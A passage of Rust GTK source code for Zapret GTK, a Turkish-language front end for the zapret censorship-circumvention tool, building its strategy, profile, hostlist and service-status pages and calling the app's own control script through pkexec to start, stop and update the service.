    bottom_box_hostlist.set_margin_start(10);
    bottom_box_hostlist.set_margin_end(10);
    bottom_box_hostlist.set_margin_bottom(20);
    bottom_box_hostlist.set_halign(gtk::Align::Center);

    let save_hostlist_btn = Button::builder()
        .label(&t("Kaydet ve Uygula"))
        .css_classes(vec!["suggested-action", "pill"])
        .width_request(160)
        .build();
    bottom_box_hostlist.append(&save_hostlist_btn);
    content_box_hostlist.append(&bottom_box_hostlist);
    let content_box_mgmt = Box::new(Orientation::Vertical, 0);
    let header_mgmt = HeaderBar::builder()
        .show_back_button(false)
        .build();
    let top_box_mgmt = Box::new(Orientation::Vertical, 10);
    top_box_mgmt.set_vexpand(true);
    top_box_mgmt.set_margin_top(20);
    top_box_mgmt.set_margin_bottom(20);
    top_box_mgmt.set_margin_start(20);
    top_box_mgmt.set_margin_end(20);
    let mgmt_title = Label::builder()
        .label(&t("Bulunan Stratejiler"))
        .css_classes(vec!["title-2"])
        .halign(gtk::Align::Start)
        .wrap(true)
        .max_width_chars(30)
        .build();
    top_box_mgmt.append(&mgmt_title);
    let mgmt_desc = Label::builder()
        .label(&t("Aşağıda Blockcheck testi sonucunda bulunan çalışan stratejiler listelenmiştir.\nKullanmak istediklerinizi seçin ve 'Uygula' butonuna tıklayın."))
        .wrap(true)
        .max_width_chars(40)
        .halign(gtk::Align::Start)
        .margin_bottom(10)
        .build();
    top_box_mgmt.append(&mgmt_desc);
    let scrolled_mgmt = ScrolledWindow::builder()
        .hscrollbar_policy(gtk::PolicyType::Never)
        .min_content_height(200)
        .vexpand(true)
        .css_classes(vec!["card"])
        .build();
    let strategies_list_box = ListBox::builder()
        .selection_mode(SelectionMode::None)
        .css_classes(vec!["boxed-list"])
        .build();
    scrolled_mgmt.set_child(Some(&strategies_list_box));
    top_box_mgmt.append(&scrolled_mgmt);
    content_box_mgmt.append(&top_box_mgmt);
    let bottom_box_mgmt = Box::new(Orientation::Vertical, 0);
    bottom_box_mgmt.set_margin_top(10);
    bottom_box_mgmt.set_margin_bottom(20);
    bottom_box_mgmt.set_margin_start(20);
    bottom_box_mgmt.set_margin_end(20);
    let profile_buttons_box = Box::new(Orientation::Horizontal, 0);
    profile_buttons_box.set_halign(gtk::Align::Center);
    profile_buttons_box.add_css_class("linked");
    profile_buttons_box.set_margin_top(6);
    profile_buttons_box.set_margin_bottom(12);

    let current_profile_id = Rc::new(Cell::new(get_active_profile_id()));
    let mut profile_buttons = Vec::new();
    let initial_profile_id = current_profile_id.get();

    for id in 1..=10 {
        let btn = Button::builder()
            .label(&id.to_string())
            .css_classes(if id == initial_profile_id {
                vec!["suggested-action"]
            } else {
                vec![]
            })
            .width_request(34)
            .height_request(32)
            .tooltip_text(&format!("{} {}", t("Profil"), id))
            .build();
        profile_buttons_box.append(&btn);
        profile_buttons.push(btn);
    }
    bottom_box_mgmt.append(&profile_buttons_box);
    let profile_btns_rc = Rc::new(profile_buttons);

    let mgmt_buttons_box = Box::new(Orientation::Horizontal, 10);
    mgmt_buttons_box.set_halign(gtk::Align::Center);
    let about_btn = Button::builder()
        .icon_name("help-about-symbolic")
        .css_classes(vec!["pill"])
        .tooltip_text(&t("Hakkında"))
        .build();
    mgmt_buttons_box.append(&about_btn);
    let settings_mgmt_btn = Button::builder()
        .icon_name("emblem-system-symbolic") 
        .css_classes(vec!["pill"])
        .tooltip_text(&t("Ayarlar"))
        .build();
    mgmt_buttons_box.append(&settings_mgmt_btn);
    let apply_button = Button::builder()
        .label(&t("Uygula"))
        .css_classes(vec!["suggested-action", "pill"])
        .build();
    mgmt_buttons_box.append(&apply_button);
    bottom_box_mgmt.append(&mgmt_buttons_box);
    content_box_mgmt.append(&bottom_box_mgmt);
    let view_mgmt = ToolbarView::builder()
        .content(&content_box_mgmt)
        .build();
    view_mgmt.add_top_bar(&header_mgmt);
    let content_box_status = Box::new(Orientation::Vertical, 0);
    let header_status = HeaderBar::builder()
        .show_back_button(true)
        .build();
    let view_status = ToolbarView::builder()
        .content(&content_box_status)
        .build();
    view_status.add_top_bar(&header_status);
    let status_box = Box::new(Orientation::Vertical, 10);
    status_box.set_margin_top(20);
    status_box.set_margin_bottom(20);
    status_box.set_margin_start(20);
    status_box.set_margin_end(20);
    status_box.add_css_class("card");
    let status_title = Label::builder()
        .label(&t("Zapret Durumu"))
        .css_classes(vec!["title-3"])
        .halign(gtk::Align::Start)
        .margin_start(10)
        .margin_top(10)
        .build();
    status_box.append(&status_title);
    let status_row = Box::new(Orientation::Horizontal, 10);
    status_row.set_margin_start(10);
    status_row.set_margin_end(10);
    status_row.set_margin_bottom(10);
    let status_label_mgmt = Label::builder()
        .label(&t("Kontrol ediliyor..."))
        .halign(gtk::Align::Start)
        .hexpand(true)
        .wrap(true)
        .max_width_chars(40)
        .build();
    status_row.append(&status_label_mgmt);
    let service_buttons_box = Box::new(Orientation::Horizontal, 8);
    let start_service_btn = Button::builder()
        .icon_name("media-playback-start-symbolic")
        .label(&t("Başlat"))
        .visible(false)
        .build();
    let stop_service_btn = Button::builder()
        .icon_name("media-playback-stop-symbolic")
        .label(&t("Durdur"))
        .visible(false)
        .build();
    let update_service_btn = Button::builder()
        .icon_name("view-refresh-symbolic")
        .label(&t("Güncelle"))
        .visible(false)
        .build();
    service_buttons_box.append(&start_service_btn);
    service_buttons_box.append(&stop_service_btn);
    service_buttons_box.append(&update_service_btn);
    status_row.append(&service_buttons_box);
    status_box.append(&status_row);
    content_box_status.append(&status_box);
    let export_box = Box::new(Orientation::Vertical, 10);
    export_box.set_margin_top(10);
    export_box.set_margin_bottom(20);
    export_box.set_margin_start(20);
    export_box.set_margin_end(20);
    let buttons_row = Box::new(Orientation::Horizontal, 20);
    buttons_row.set_halign(gtk::Align::Center);
    let import_btn_content = Box::new(Orientation::Horizontal, 10);
    import_btn_content.set_halign(gtk::Align::Center);
    let import_icon = gtk::Image::from_icon_name("document-open-symbolic");
    let import_lbl = Label::new(Some(&t("İçe Aktar")));
    import_btn_content.append(&import_icon);
    import_btn_content.append(&import_lbl);
    let import_button_status = Button::builder()
        .child(&import_btn_content)
        .css_classes(vec!["pill"])
        .width_request(190)
        .build();
    buttons_row.append(&import_button_status);
    let export_btn_content = Box::new(Orientation::Horizontal, 10);
    export_btn_content.set_halign(gtk::Align::Center);
    let export_icon = gtk::Image::from_icon_name("document-save-symbolic");
    let export_lbl = Label::new(Some(&t("Dışa Aktar")));
    export_btn_content.append(&export_icon);
    export_btn_content.append(&export_lbl);
    let export_button = Button::builder()
        .child(&export_btn_content)
        .css_classes(vec!["pill"])
        .width_request(190)
        .build();
    buttons_row.append(&export_button);
    export_box.append(&buttons_row);

    let preset_status_btn_content = Box::new(Orientation::Horizontal, 8);
    preset_status_btn_content.set_halign(gtk::Align::Center);
    let preset_status_icon = gtk::Image::from_icon_name("starred-symbolic");
    let preset_status_lbl = Label::new(Some(&t("Hazır Stratejileri Yükle (Hızlı Kurulum)")));
    preset_status_btn_content.append(&preset_status_icon);
    preset_status_btn_content.append(&preset_status_lbl);

    let preset_status_button = Button::builder()
        .child(&preset_status_btn_content)
        .css_classes(vec!["pill"])
        .halign(gtk::Align::Center)
        .margin_start(10)
        .margin_end(10)
        .margin_top(10)
        .margin_bottom(5)
        .build();
    export_box.append(&preset_status_button);

    let folder_buttons_row = Box::new(Orientation::Horizontal, 20);
    folder_buttons_row.set_halign(gtk::Align::Center);
    folder_buttons_row.set_margin_top(10);

    let opt_btn_content = Box::new(Orientation::Horizontal, 10);
    opt_btn_content.set_halign(gtk::Align::Center);
    let opt_icon = gtk::Image::from_icon_name("folder-symbolic");
    let opt_lbl = Label::new(Some("opt"));
    opt_btn_content.append(&opt_icon);
    opt_btn_content.append(&opt_lbl);
    let opt_button = Button::builder()
        .child(&opt_btn_content)
        .css_classes(vec!["pill"])
        .width_request(120)
        .build();
    opt_button.connect_clicked(move |_| {
        let _ = Command::new("xdg-open")
            .arg("/opt/zapret")
            .spawn();
    });
    folder_buttons_row.append(&opt_button);

    let config_btn_content = Box::new(Orientation::Horizontal, 10);
    config_btn_content.set_halign(gtk::Align::Center);
    let config_icon = gtk::Image::from_icon_name("folder-symbolic");
    let config_lbl = Label::new(Some(".config"));
    config_btn_content.append(&config_icon);
    config_btn_content.append(&config_lbl);
    let config_button = Button::builder()
        .child(&config_btn_content)
        .css_classes(vec!["pill"])
        .width_request(120)
        .build();
    config_button.connect_clicked(move |_| {
        if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
            let config_dir = proj_dirs.config_dir();
            if !config_dir.exists() {
                let _ = fs::create_dir_all(config_dir);
            }
            let _ = Command::new("xdg-open")
                .arg(config_dir)
                .spawn();
        }
    });
    folder_buttons_row.append(&config_button);

    let json_btn_content = Box::new(Orientation::Horizontal, 10);
    json_btn_content.set_halign(gtk::Align::Center);
    let json_icon = gtk::Image::from_icon_name("text-x-generic-symbolic");
    let json_lbl = Label::new(Some("json"));
    json_btn_content.append(&json_icon);
    json_btn_content.append(&json_lbl);
    let json_button = Button::builder()
        .child(&json_btn_content)
        .css_classes(vec!["pill"])
        .width_request(120)
        .build();
    let curr_p_for_json = current_profile_id.clone();
    json_button.connect_clicked(move |_| {
        let act_id = curr_p_for_json.get();
        let json_path = get_profile_path(act_id);
        if !json_path.exists() {
            let _ = fs::write(&json_path, "[\n]\n");
        }
        let _ = Command::new("xdg-open")
            .arg(&json_path)
            .spawn();
    });
    folder_buttons_row.append(&json_button);
    export_box.append(&folder_buttons_row);

    content_box_status.append(&export_box);

    let bottom_actions_box = Box::new(Orientation::Horizontal, 10);
    bottom_actions_box.set_margin_top(20);
    bottom_actions_box.set_margin_bottom(20);
    bottom_actions_box.set_halign(gtk::Align::Center);

    let hostlist_btn = Button::builder()
        .label(&t("Hostlist"))
        .css_classes(vec!["pill"])
        .width_request(110)
        .build();

    let search_strat_settings_btn = Button::builder()
        .label(&t("Strateji Ara"))
        .css_classes(vec!["pill"])
        .width_request(110)
        .build();

    if is_strategies_json_non_empty() {
        search_strat_settings_btn.add_css_class("warning");
    }

    let delete_btn = Button::builder()
        .label(&t("Zapret'i Sil"))
        .css_classes(vec!["destructive-action", "pill"])
        .width_request(110)
        .build();

    bottom_actions_box.append(&hostlist_btn);
    bottom_actions_box.append(&search_strat_settings_btn);
    bottom_actions_box.append(&delete_btn);
    content_box_status.append(&bottom_actions_box);

    let has_update_status = Rc::new(Cell::new(None::<bool>));
    let has_update_timer = has_update_status.clone();
    let status_label_mgmt_timer = status_label_mgmt.clone();
    let start_btn_timer = start_service_btn.clone();
    let stop_btn_timer = stop_service_btn.clone();
    let update_btn_timer = update_service_btn.clone();

    let (upd_check_sender, upd_check_receiver) = mpsc::channel::<Option<bool>>();
    let upd_check_sender_timer = upd_check_sender.clone();

    glib::timeout_add_local(Duration::from_secs(10), move || {
        let init_sys = get_init_system();
        let mut is_active = false;
        if init_sys == "systemd" {
            if let Ok(o) = Command::new("systemctl").arg("is-active").arg("zapret").output() {
                if String::from_utf8_lossy(&o.stdout).trim() == "active" { is_active = true; }
            }
        } else if init_sys == "openrc" {
            if let Ok(o) = Command::new("rc-service").arg("zapret").arg("status").output() {
                if o.status.success() { is_active = true; }
            }
        } else if init_sys == "runit" {
            if let Ok(o) = Command::new("sv").arg("status").arg("zapret").output() {
                if String::from_utf8_lossy(&o.stdout).trim().starts_with("run:") { is_active = true; }
            }
        } else if init_sys == "sysvinit" {
            if let Ok(o) = Command::new("service").arg("zapret").arg("status").output() {
                let out = String::from_utf8_lossy(&o.stdout);
                if out.contains("is running") || o.status.success() { is_active = true; }
            }
        } else if init_sys == "dinit" {
            if let Ok(o) = Command::new("dinitctl").arg("status").arg("zapret").output() {
                let out = String::from_utf8_lossy(&o.stdout);
                if out.contains("State: STARTED") { is_active = true; }
            }
        } else if let Ok(o) = Command::new("pgrep").arg("-x").arg("nfqws").output() {
            if o.status.success() { is_active = true; }
        }

        let s_check = upd_check_sender_timer.clone();
        thread::spawn(move || {
            let upd = check_zapret_update_available();
            let _ = s_check.send(upd);
        });

        while let Ok(upd) = upd_check_receiver.try_recv() {
            has_update_timer.set(upd);
            if upd == Some(true) {
                update_btn_timer.set_visible(true);
                update_btn_timer.add_css_class("suggested-action");
                update_btn_timer.set_tooltip_text(Some(&t("Yeni bir Zapret güncellemesi mevcut!")));
            } else {
                update_btn_timer.set_visible(false);
                update_btn_timer.remove_css_class("suggested-action");
                update_btn_timer.set_tooltip_text(Some(&t("Zapret güncel.")));
            }
        }

        let update_suffix = match has_update_timer.get() {
            Some(true) => format!(" • {}", t("Güncelleme Mevcut")),
            Some(false) => format!(" • {}", t("Güncel")),
            None => String::new(),
        };

        if is_active {
            status_label_mgmt_timer.set_label(&format!("{}{}", t("Çalışıyor (Active)"), update_suffix));
            status_label_mgmt_timer.add_css_class("success");
            status_label_mgmt_timer.remove_css_class("error");
            start_btn_timer.set_visible(false);
            stop_btn_timer.set_visible(true);
        } else {
            status_label_mgmt_timer.set_label(&format!("{}{}", t("Durdu"), update_suffix));
            status_label_mgmt_timer.add_css_class("error");
            status_label_mgmt_timer.remove_css_class("success");
            start_btn_timer.set_visible(true);
            stop_btn_timer.set_visible(false);
        }
        glib::ControlFlow::Continue
    });
    let page_mgmt = NavigationPage::builder()
        .child(&view_mgmt)
        .title(&t("Zapret GTK"))
        .tag("management_page")
        .build();
    let page_status = NavigationPage::builder()
        .child(&view_status)
        .title(&t("Ayarlar"))
        .tag("status_page")
        .build();
    let list_mgmt_for_settings = strategies_list_box.clone();
    let nav_view_for_settings = nav_view.clone();
    let page_status_clone = page_status.clone();
    let search_strat_btn_for_nav = search_strat_settings_btn.clone();
    let curr_p_for_settings = current_profile_id.clone();
    settings_mgmt_btn.connect_clicked(move |_| {
        let act_id = curr_p_for_settings.get();
        let current_items = extract_strategies_from_list_box(&list_mgmt_for_settings);
        if !current_items.is_empty() {
            let _ = save_profile_strategies(act_id, &current_items);
        }
        if is_profile_non_empty(act_id) {
            search_strat_btn_for_nav.add_css_class("warning");
        } else {
            search_strat_btn_for_nav.remove_css_class("warning");
        }
        nav_view_for_settings.push(&page_status_clone);
    });
    let window = ApplicationWindow::builder()
        .application(app)
        .title("Zapret GTK")
        .default_width(450)
        .default_height(500)
        .content(&nav_view)
        .build();

    let current_pid = Arc::new(Mutex::new(None::<u32>));
    let test_cancel_flag = Arc::new(AtomicBool::new(false));
    let install_child_pid = Arc::new(Mutex::new(None::<u32>));
    let install_cancel_flag = Arc::new(AtomicBool::new(false));

    let pid_on_close = current_pid.clone();
    let install_pid_on_close = install_child_pid.clone();
    let cf_on_close = test_cancel_flag.clone();
    let install_cf_on_close = install_cancel_flag.clone();
    let app_for_close = app.clone();

    window.connect_close_request(move |_| {
        cf_on_close.store(true, Ordering::Relaxed);
        install_cf_on_close.store(true, Ordering::Relaxed);
        let pid_opt = pid_on_close.lock().ok().and_then(|g| *g);
        let inst_pid_opt = install_pid_on_close.lock().ok().and_then(|g| *g);
        let target_pid = pid_opt.or(inst_pid_opt).unwrap_or(0);

        let hold_guard = app_for_close.hold();
        let (tx, rx) = mpsc::channel::<()>();

        thread::spawn(move || {
            let _ = Command::new("pkexec")
                .arg(get_zapret_control_path())
                .arg("cleanup-session")
                .arg(target_pid.to_string())
                .output();

            let _ = tx.send(());
        });

        let mut guard_opt = Some(hold_guard);
        glib::timeout_add_local(Duration::from_millis(30), move || {
            match rx.try_recv() {
                Ok(()) | Err(mpsc::TryRecvError::Disconnected) => {
                    guard_opt.take();
                    glib::ControlFlow::Break
                }
                Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
            }
        });

        glib::Propagation::Proceed
    });

    start_service_btn.connect_clicked(move |_| {
         let _ = Command::new("pkexec").arg(get_zapret_control_path()).arg("start").spawn();
    });

    stop_service_btn.connect_clicked(move |_| {
         let _ = Command::new("pkexec").arg(get_zapret_control_path()).arg("stop").spawn();
    });

    let win_update = window.clone();
    let update_btn_click = update_service_btn.clone();
    let status_lbl_click = status_label_mgmt.clone();
    let (upd_action_sender, upd_action_receiver) = mpsc::channel::<Result<(), String>>();

    let win_action_timer = window.clone();
    let update_btn_action_timer = update_service_btn.clone();
    let status_lbl_action_timer = status_label_mgmt.clone();
    let has_update_action_timer = has_update_status.clone();
    glib::timeout_add_local(Duration::from_millis(100), move || {
        match upd_action_receiver.try_recv() {
            Ok(Ok(())) => {
                has_update_action_timer.set(Some(false));
                update_btn_action_timer.set_visible(false);
                update_btn_action_timer.set_sensitive(true);
                update_btn_action_timer.remove_css_class("suggested-action");
                update_btn_action_timer.set_tooltip_text(Some(&t("Zapret güncel.")));
                status_lbl_action_timer.set_label(&format!("{} • {}", t("Çalışıyor (Active)"), t("Güncel")));
                let success_dlg = adw::MessageDialog::builder()
                    .transient_for(&win_action_timer)
                    .heading(&t("Başarılı"))
                    .body(&t("Zapret başarıyla en son sürüme güncellendi."))
                    .build();
                success_dlg.add_response("ok", &t("Tamam"));
                success_dlg.present();
            },
            Ok(Err(err_text)) => {
                update_btn_action_timer.set_sensitive(true);
                let err_dlg = adw::MessageDialog::builder()
                    .transient_for(&win_action_timer)
                    .heading(&t("Güncelleme Hatası"))
                    .body(&t("Zapret güncellenirken hata oluştu: {}").replace("{}", &err_text))
                    .build();
                err_dlg.add_response("ok", &t("Tamam"));
                err_dlg.present();
            },
            Err(mpsc::TryRecvError::Empty) => {},
            Err(mpsc::TryRecvError::Disconnected) => {},
        }
        glib::ControlFlow::Continue
    });

    let upd_action_sender_click = upd_action_sender.clone();
    update_service_btn.connect_clicked(move |_| {
        let commit_hash_opt = get_zapret_remote_commit_hash();
        let commit_info = match &commit_hash_opt {
            Some(h) => format!("\n\n(Hedef Sürüm: {})", &h[..7.min(h.len())]),
            None => String::new(),
        };
        let body_text = format!("{}{}", t("Zapret'in en son sürümü indirilip yeniden derlenecek ve servis yeniden başlatılacak. Devam edilsin mi?"), commit_info);
        let dialog = adw::MessageDialog::builder()
            .transient_for(&win_update)
            .heading(&t("Zapret Güncellemesi"))
            .body(&body_text)
            .build();
        dialog.add_response("cancel", &t("İptal"));
        dialog.add_response("update", &t("Güncelle"));
        dialog.set_response_appearance("update", ResponseAppearance::Suggested);
        
        let btn_dlg = update_btn_click.clone();
        let lbl_dlg = status_lbl_click.clone();
        let s_action = upd_action_sender_click.clone();
        dialog.connect_response(None, move |d, response| {
            d.close();
            if response == "update" {
                btn_dlg.set_sensitive(false);
                lbl_dlg.set_label(&t("Güncelleniyor..."));
                let s_thread = s_action.clone();
                
                thread::spawn(move || {
                    let res = Command::new("pkexec")
                        .arg(get_zapret_control_path())
                        .arg("update")
                        .output();

                    match res {
                        Ok(ref output) if output.status.success() => {
                            let _ = s_thread.send(Ok(()));
                        },
                        Ok(ref output) => {
                            let err_text = String::from_utf8_lossy(&output.stderr).to_string();
                            let _ = s_thread.send(Err(err_text));
                        },
                        Err(ref e) => {
                            let _ = s_thread.send(Err(e.to_string()));
                        }
                    }
                });
            }
        });
        dialog.present();
    });

    let win_preset_status = window.clone();
    let list_mgmt_preset_status = strategies_list_box.clone();
    let nav_mgmt_preset_status = nav_view.clone();
    let page_mgmt_preset_status = page_mgmt.clone();
    let search_strat_btn_for_preset = search_strat_settings_btn.clone();
    let curr_p_for_preset_status = current_profile_id.clone();
    preset_status_button.connect_clicked(move |_| {
        let target_id = curr_p_for_preset_status.get();
        let dialog = adw::MessageDialog::builder()
            .transient_for(&win_preset_status)
            .heading(&t("Hazır Stratejileri Yükle"))
            .body(&t("Bu stratejiler çoğu durumda çalışır ancak her internet servis sağlayıcısında veya ağda çalışmayabilir.\n\nYine de devam edip kurmak istiyor musunuz?"))
            .build();
        dialog.add_response("cancel", &t("İptal"));
        dialog.add_response("confirm", &t("Evet, Devam Et"));
        dialog.set_response_appearance("confirm", ResponseAppearance::Suggested);
        dialog.set_response_appearance("cancel", ResponseAppearance::Destructive);

        let win_t = win_preset_status.clone();
        let list_t = list_mgmt_preset_status.clone();
        let nav_t = nav_mgmt_preset_status.clone();
        let page_t = page_mgmt_preset_status.clone();
        let search_btn_t = search_strat_btn_for_preset.clone();
        dialog.connect_response(None, move |d, response| {
            d.close();
            if response == "confirm" {
                match apply_preset_strategies_to_profile(target_id) {
                    Ok(_) => {
                        let loaded = load_profile_strategies(target_id);
                        populate_strategies_box(&list_t, &loaded);
                        search_btn_t.add_css_class("warning");
                        nav_t.replace(&[page_t.clone()]);

                        let success_dlg = adw::MessageDialog::builder()
                            .transient_for(&win_t)
                            .heading(&t("Başarılı"))
                            .body(&t("Hazır stratejiler seçili profile kaydedildi."))
                            .build();
                        success_dlg.add_response("ok", &t("Tamam"));
                        success_dlg.present();
                    },
                    Err(e) => {
                        let err_dlg = adw::MessageDialog::builder()
                            .transient_for(&win_t)
                            .heading(&t("Hata"))
                            .body(&t("Dosya kaydedilemedi: {}").replace("{}", &e.to_string()))
                            .build();
                        err_dlg.add_response("ok", &t("Tamam"));
                        err_dlg.present();
                    }
                }
            }
        });
        dialog.present();
    });

    let win_rescan_btn = window.clone();
    let nav_view_rescan_btn = nav_view.clone();
    let page_rescan_for_btn = page_rescan.clone();
    let page_rescan_check_for_btn = page_rescan_check.clone();
    let status_lbl_rescan_chk = status_label_rescan_check.clone();
    let conflict_lbl_rescan_chk = conflict_list_label_rescan.clone();
    let force_btn_rescan_chk = force_continue_btn_rescan.clone();
    let spinner_rescan_chk = spinner_rescan_check.clone();

    let nav_force_rescan = nav_view.clone();
    let page_rescan_force = page_rescan.clone();
    force_continue_btn_rescan.connect_clicked(move |_| {
        nav_force_rescan.push(&page_rescan_force);
    });

    let nav_stop_rescan = nav_view.clone();
    let page_rescan_stop = page_rescan.clone();
    stop_continue_btn_rescan.connect_clicked(move |_| {
        let _ = Command::new("pkexec")
            .arg(get_zapret_control_path())
            .arg("stop")
            .output();
        nav_stop_rescan.push(&page_rescan_stop);
    });

    let run_rescan_vpn_check = {
        let nav = nav_view_rescan_btn.clone();
        let p_check = page_rescan_check_for_btn.clone();
        let p_target = page_rescan_for_btn.clone();
        let lbl_s = status_lbl_rescan_chk.clone();
        let lbl_c = conflict_lbl_rescan_chk.clone();
        let btn_f = force_btn_rescan_chk.clone();
        let btn_stop = stop_continue_btn_rescan.clone();
        let spn_s = spinner_rescan_chk.clone();
        Rc::new(move || {
            nav.push(&p_check);
            lbl_s.set_label(&t("Sistem ve VPN çakışmaları taranıyor..."));
            lbl_s.remove_css_class("error");
            lbl_s.remove_css_class("success");
            lbl_c.set_label("");
            btn_f.set_visible(false);
            btn_stop.set_visible(false);
            spn_s.set_spinning(true);
            spn_s.set_visible(true);

            let (tx, rx) = mpsc::channel();
            thread::spawn(move || {
                thread::sleep(Duration::from_millis(600));
                let conflicts = check_processes();
                let _ = tx.send(conflicts);
            });

            let lbl_status_timer = lbl_s.clone();
            let lbl_conflict_timer = lbl_c.clone();
            let btn_force_timer = btn_f.clone();
            let btn_stop_timer = btn_stop.clone();
            let spinner_timer = spn_s.clone();
            let nav_timer = nav.clone();
            let page_target_timer = p_target.clone();
            glib::timeout_add_local(Duration::from_millis(100), move || {
                match rx.try_recv() {
                    Ok(conflicts) => {
                        spinner_timer.set_spinning(false);
                        spinner_timer.set_visible(false);
                        if conflicts.is_empty() {
                            lbl_status_timer.set_label(&t("Sorun bulunmadı."));
                            lbl_status_timer.add_css_class("success");
                            let n = nav_timer.clone();
                            let p = page_target_timer.clone();
                            glib::timeout_add_local(Duration::from_millis(800), move || {
                                n.push(&p);
                                glib::ControlFlow::Break
                            });
                        } else {
                            lbl_status_timer.set_label(&t("Çakışan Uygulamalar Tespit Edildi!"));
                            lbl_status_timer.add_css_class("error");
                            let list_str = conflicts.join(", ");
                            lbl_conflict_timer.set_label(&t("Şu servisler kapatılmalı: {}").replace("{}", &list_str));
                            btn_stop_timer.set_visible(true);
                            btn_force_timer.set_visible(true);
                        }
                        glib::ControlFlow::Break
                    },
                    Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
                    Err(mpsc::TryRecvError::Disconnected) => glib::ControlFlow::Break,
                }
            });
        })
    };

    let nav_hostlist_click = nav_view.clone();
    let page_hostlist_click = page_hostlist.clone();
    let entries_container_hl_click = entries_container_hostlist.clone();
    let add_btn_hl_click = add_button_hostlist.clone();
    let curr_p_for_hl_btn = current_profile_id.clone();
    let page_hl_clone_tag = page_hostlist.clone();
    let save_hl_btn_tag = save_hostlist_btn.clone();
    hostlist_btn.connect_clicked(move |_| {
        let act_id = curr_p_for_hl_btn.get();
        let domains = load_profile_hostlist(act_id);
        populate_hostlist_entries(&entries_container_hl_click, &add_btn_hl_click, &domains);
        page_hl_clone_tag.set_title(&format!("{} ({} {})", t("Hostlist"), t("Profil"), act_id));
        if act_id == get_active_profile_id() {
            save_hl_btn_tag.set_label(&t("Kaydet ve Uygula"));
        } else {
            save_hl_btn_tag.set_label(&t("Kaydet"));
        }
        nav_hostlist_click.push(&page_hostlist_click);
    });

    let entries_container_save_hl = entries_container_hostlist.clone();
    let curr_p_for_save_hl = current_profile_id.clone();
    let win_save_hl = window.clone();
    save_hostlist_btn.connect_clicked(move |_| {
        let act_id = curr_p_for_save_hl.get();
        let is_active = act_id == get_active_profile_id();
        let mut domains = Vec::new();
        let mut current_child = entries_container_save_hl.first_child();
        while let Some(child) = current_child {
            if let Ok(entry) = child.clone().downcast::<Entry>() {
                let text = entry.text().trim().to_string();
                if !text.is_empty() {
                    if text.starts_with("http://") || text.starts_with("https://") || text.starts_with("www.") {
                        let dialog = adw::MessageDialog::builder()
                            .transient_for(&win_save_hl)
                            .heading(&t("Hatalı Alan Adı"))
                            .body(&t("'{}' geçerli bir alan adı formatı değil.\nLütfen 'http://', 'https://' veya 'www.' kullanmadan sadece alan adını girin (örnek: google.com).").replace("{}", &text))
                            .build();
                        dialog.add_response("ok", &t("Tamam"));
                        dialog.present();
                        return;
                    }
                    domains.push(text);
                }
            }
            current_child = child.next_sibling();
        }

        if let Err(e) = save_profile_hostlist(act_id, &domains) {
            let err_dlg = adw::MessageDialog::builder()
                .transient_for(&win_save_hl)
                .heading(&t("Hata"))
                .body(&t("Dosya kaydedilemedi: {}").replace("{}", &e.to_string()))
                .build();
            err_dlg.add_response("ok", &t("Tamam"));
            err_dlg.present();
            return;
        }

        if is_active {
            let _ = apply_profile_hostlist_to_zapret(act_id);
            let success_dlg = adw::MessageDialog::builder()
                .transient_for(&win_save_hl)
                .heading(&t("Başarılı"))
                .body(&t("Profil {} hostlist kaydedildi ve uygulandı.").replace("{}", &act_id.to_string()))
                .build();
            success_dlg.add_response("ok", &t("Tamam"));
            success_dlg.present();
        } else {
            let success_dlg = adw::MessageDialog::builder()
                .transient_for(&win_save_hl)
                .heading(&t("Başarılı"))
                .body(&t("Profil {} hostlist kaydedildi.").replace("{}", &act_id.to_string()))
                .build();
            success_dlg.add_response("ok", &t("Tamam"));
            success_dlg.present();
        }
    });

    let check_flow_click = run_rescan_vpn_check.clone();
    let curr_p_for_search_btn = current_profile_id.clone();
    search_strat_settings_btn.connect_clicked(move |_| {
        let flow = check_flow_click.clone();
        let act_id = curr_p_for_search_btn.get();
        if is_profile_non_empty(act_id) {
            let dialog = adw::MessageDialog::builder()
                .transient_for(&win_rescan_btn)
                .heading(&t("Strateji Araması"))
                .body(&t("Profil {} için mevcut kayıtlı stratejilerinizin üzerine yeni bulunacak stratejiler yazılacaktır. Devam etmek istiyor musunuz?").replace("{}", &act_id.to_string()))
                .build();
            dialog.add_response("cancel", &t("Vazgeç"));
            dialog.add_response("continue", &t("Devam Et"));
            dialog.set_response_appearance("cancel", ResponseAppearance::Destructive);
            dialog.set_response_appearance("continue", ResponseAppearance::Suggested);
            dialog.connect_response(None, move |d, response| {
                d.close();
                if response == "continue" {
                    flow();
                }
            });
            dialog.present();
        } else {
            flow();
        }
    });

    let entries_container_rescan_read = entries_container_rescan.clone();
    let window_clone_rescan = window.clone();
    let nav_view_rescan_test = nav_view.clone();
    let page_test_rescan = page_test.clone();
    let label_test_counter_rescan = label_test_counter.clone();
    let label_test_title_rescan = label_test_title.clone();
    let label_test_info_rescan = label_test_info.clone();
    let test_cancel_flag_rescan = test_cancel_flag.clone();
    let current_pid_rescan = current_pid.clone();
    let nav_view_mgmt_rescan = nav_view.clone();
    let page_mgmt_rescan = page_mgmt.clone();
    let list_box_mgmt_rescan = strategies_list_box.clone();
    let curr_p_for_finish_rescan = current_profile_id.clone();

    finish_button_rescan.connect_clicked(move |_| {
        let target_profile_id_rescan = curr_p_for_finish_rescan.get();
        let mut domains = Vec::new();
        let mut current_child = entries_container_rescan_read.first_child();
        while let Some(child) = current_child {
            if let Ok(entry) = child.clone().downcast::<Entry>() {
                let text = entry.text();
                if !text.is_empty() {
                    let domain = text.to_string();
                    if domain.starts_with("http://") || domain.starts_with("https://") || domain.starts_with("www.") {
                        let dialog = adw::MessageDialog::builder()
                            .transient_for(&window_clone_rescan)
                            .heading(&t("Hatalı Alan Adı"))
                            .body(&t("'{}' geçerli bir alan adı formatı değil.\nLütfen 'http://', 'https://' veya 'www.' kullanmadan sadece alan adını girin (örnek: google.com).").replace("{}", &domain))
                            .build();
                        dialog.add_response("ok", &t("Tamam"));
                        dialog.present();
                        return;
                    }
                    domains.push(domain);
                }
            }
            current_child = child.next_sibling();
        }
        if domains.is_empty() {
            let dialog = adw::MessageDialog::builder()
                .transient_for(&window_clone_rescan)
                .heading(&t("Hata"))
                .body(&t("Lütfen test edilecek en az bir alan adı girin."))
                .build();
            dialog.add_response("ok", &t("Tamam"));
            dialog.present();
            return;
        }
        let dialog = adw::MessageDialog::builder()
            .transient_for(&window_clone_rescan)
            .heading(&t("Tarama Modu Seçin"))
